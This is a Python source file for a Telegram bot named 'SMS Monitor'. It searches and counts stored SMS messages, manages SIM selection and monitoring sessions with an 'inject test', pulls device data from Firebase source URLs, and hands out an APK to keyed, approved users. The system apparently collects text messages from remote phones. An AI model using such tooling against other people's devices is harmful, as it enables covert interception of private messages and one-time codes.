async def search_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized(update.effective_user.id if update.effective_user else None):
        return

    if not context.args:
        await update.message.reply_text("❌ <code>/search &lt;keyword&gt;</code>", parse_mode="HTML")
        return

    keyword = " ".join(context.args).lower()
    db: Session = SessionLocal()
    try:
        messages = (
            db.query(SMSMessage)
            .filter(SMSMessage.message.ilike(f"%{keyword}%"))
            .order_by(SMSMessage.received_at.desc())
            .limit(10)
            .all()
        )
    finally:
        db.close()

    if not messages:
        await update.message.reply_text(f"🔍 No messages found for: `{keyword}`", parse_mode="Markdown")
        return

    parts = [f"🔍 *Search results for:* `{keyword}`\n"]
    for sms in messages:
        parts.append(format_sms(sms))
        parts.append("—" * 20)

    await update.message.reply_text("\n".join(parts), parse_mode="Markdown")


async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized(update.effective_user.id if update.effective_user else None):
        return

    db: Session = SessionLocal()
    try:
        total = db.query(SMSMessage).count()
        device_count = db.query(Device).count()
        latest = (
            db.query(SMSMessage)
            .order_by(SMSMessage.received_at.desc())
            .first()
        )
    finally:
        db.close()

    latest_text = "Never"
    if latest:
        latest_text = latest.received_at.astimezone(timezone.utc).strftime("%d %b %Y, %H:%M UTC")

    await update.message.reply_text(
        f"📊 *SMS Monitor Stats*\n\n"
        f"Total messages: *{total}*\n"
        f"Total devices: *{device_count}*\n"
        f"Last received: {latest_text}",
        parse_mode="Markdown",
    )


async def _activate_monitoring(
    db: Session,
    user_id: int,
) -> tuple[MonitorProfile, Device, int, int]:
    profile = get_monitor_profile(db, user_id)
    device = get_active_device(db, user_id)
    if not profile or not device:
        raise ValueError("Pehle /fdy <device_id> se device select karo")

    profile, device = start_monitoring(db, user_id)
    await _prepare_monitoring(db, user_id, profile, device)

    from app.firebase_sms_sync import (
        MONITORING_START_SNAPSHOT_SEC,
        finish_monitoring_baseline,
        mark_monitoring_baseline_started,
        snapshot_firebase_sms_seen,
    )

    mark_monitoring_baseline_started(device, profile, db)
    ignored = 0
    try:
        ignored = await asyncio.wait_for(
            snapshot_firebase_sms_seen(profile, device, db),
            timeout=MONITORING_START_SNAPSHOT_SEC,
        )
    except asyncio.TimeoutError:
        logger.warning("Baseline snapshot slow — continuing in background for %s", device.name)
        asyncio.create_task(finish_monitoring_baseline(profile.id, device.id))
    except Exception as exc:
        logger.warning("Baseline snapshot failed: %s", exc)
        asyncio.create_task(finish_monitoring_baseline(profile.id, device.id))

    inject_total_ms = 15
    try:
        _, inject_total_ms = await asyncio.wait_for(
            send_polling_startup_test(db, profile, device),
            timeout=5.0,
        )
    except Exception as exc:
        logger.warning("Startup test failed: %s", exc)

    return profile, device, int(ignored), inject_total_ms


def _monitoring_start_error_hint(message: str) -> str:
    lower = message.lower()
    if "select sim" in lower:
        return "Pehle SIM select karo"
    if "mynum" in lower:
        return "Pehle /mynum <number> set karo"
    if "channel" in lower:
        return "Pehle /addchannel karo"
    if "key" in lower:
        return "Pehle /key KEY-XXXX set karo + APK START SERVICE"
    return message


async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    if not query or not query.data:
        return

    user = query.from_user
    if not is_authorized(user.id if user else None):
        await query.answer("Unauthorized")
        return

    data = query.data
    db: Session = SessionLocal()
    answered = False

    try:
        if data.startswith("sim:"):
            _, device_id, sim_index = data.split(":")
            await query.answer("⏳ SIM select ho raha hai...")
            answered = True

            device = db.query(Device).filter(Device.id == int(device_id)).first()
            if not device:
                try:
                    await query.edit_message_text("❌ Device nahi mili", parse_mode="HTML")
                except Exception:
                    pass
                return

            if device.firebase_source_url:
                try:
                    device = await asyncio.wait_for(
                        sync_device_from_firebase(db, device),
                        timeout=5.0,
                    )
                except asyncio.TimeoutError:
                    logger.warning("SIM select: Firebase sync timed out for %s", device.name)
            profile = select_sim_slot(db, user.id, int(sim_index))
            db.commit()
            asyncio.create_task(sync_profile_for_user(user.id))
            active = get_selected_sim(device, int(sim_index))
            await query.edit_message_text(
                format_sim_selected_card(device, profile.selected_sim_index or 0),
                parse_mode="HTML",
                reply_markup=sim_monitoring_keyboard(device),
            )
            return

        if data.startswith("stop:") or data == "monitor:stop":
            await query.answer("Monitoring stopped")
            answered = True
            profile = stop_monitoring(db, user.id)
            device = get_active_device(db, user.id)
            cancel_auto_stop(user.id)
            asyncio.create_task(sync_profile_for_user(user.id))
            text, keyboard = await _sim_menu_after_stop(db, user.id, device, profile)
            await query.edit_message_text(text, parse_mode="HTML", reply_markup=keyboard)
            return

        if data.startswith("monitor:start:"):
            await query.answer("⏳ Monitoring start...")
            answered = True
            try:
                await query.edit_message_text(
                    "⏳ <b>Monitoring start ho raha hai...</b>\nAPK config + inject test",
                    parse_mode="HTML",
                )
            except Exception:
                pass

            try:
                profile, device, ignored, inject_total_ms = await _activate_monitoring(db, user.id)
            except ValueError as exc:
                hint = _monitoring_start_error_hint(str(exc))
                try:
                    await query.edit_message_text(f"❌ <b>ERROR</b>\n\n{hint}", parse_mode="HTML")
                except Exception:
                    pass
                return

            bot = query.get_bot()
            await _deliver_monitoring_started(
                bot,
                query.message.chat_id,
                profile,
                device,
                ignored,
                message_id=query.message.message_id,
                reply_func=query.edit_message_text,
                inject_total_ms=inject_total_ms or 15,
            )
            schedule_auto_stop(user.id, profile.auto_stop_minutes or 15)
            return

        if data == "monitor:on":
            await query.answer("Monitoring ON button use karo", show_alert=False)
            answered = True
    except Exception as exc:
        logger.error("Callback error: %s", exc)
        if not answered:
            try:
                await query.answer(f"Error: {exc}", show_alert=True)
            except Exception:
                pass
    finally:
        db.close()


def build_telegram_app() -> Application | None:
    if not settings.telegram_bot_token:
        logger.warning("TELEGRAM_BOT_TOKEN not set; Telegram bot disabled")
        return None

    app = (
        Application.builder()
        .token(settings.telegram_bot_token)
        .concurrent_updates(True)
        .build()
    )
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("guide", guide_command))
    app.add_handler(CommandHandler("apk", apk_command))
    app.add_handler(CommandHandler("download", apk_command))
    app.add_handler(CommandHandler("mynum", mynum_command))
    app.add_handler(CommandHandler("addchannel", addchannel_command))
    channel_text = filters.TEXT & ~filters.COMMAND
    app.add_handler(
        MessageHandler(filters.UpdateType.CHANNEL_POSTS & channel_text, channel_sms_handler),
        group=0,
    )
    app.add_handler(
        MessageHandler(
            (filters.ChatType.GROUP | filters.ChatType.SUPERGROUP) & channel_text,
            channel_sms_handler,
        ),
        group=0,
    )
    app.add_handler(CommandHandler("startmonitar", startmonitar_command))
    app.add_handler(CommandHandler("startmonitor", startmonitar_command))
    app.add_handler(CommandHandler("stopmonitar", stopmonitar_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(CommandHandler("allfirebase", allfirebase_command))
    app.add_handler(CommandHandler("setfirebase", setfirebase_command))
    app.add_handler(MessageHandler(filters.Document.ALL, firebase_txt_upload_handler))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("resume", resume_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("send", send_command))
    app.add_handler(CommandHandler("ping", ping_command))
    app.add_handler(CommandHandler("approve", approve_command))
    app.add_handler(CommandHandler("adduser", approve_command))
    app.add_handler(CommandHandler("revoke", revoke_command))
    app.add_handler(CommandHandler("users", users_command))
    app.add_handler(CommandHandler("key", key_command))
    app.add_handler(CommandHandler("fdy", fdy_command))
    app.add_handler(CommandHandler("fy", fy_command))
    app.add_handler(CommandHandler("fb", fdy_command))
    app.add_handler(CommandHandler("la", fdy_command))
    app.add_handler(CommandHandler("a", a_command))
    app.add_handler(CommandHandler("setdevice", setdevice_command))
    app.add_handler(CommandHandler("devices", devices_command))
    app.add_handler(CommandHandler("device", device_command))
    app.add_handler(CommandHandler("adddevice", adddevice_command))
    app.add_handler(CommandHandler("recent", recent_command))
    app.add_handler(CommandHandler("search", search_command))
    app.add_handler(CommandHandler("stats", stats_command))
    return app
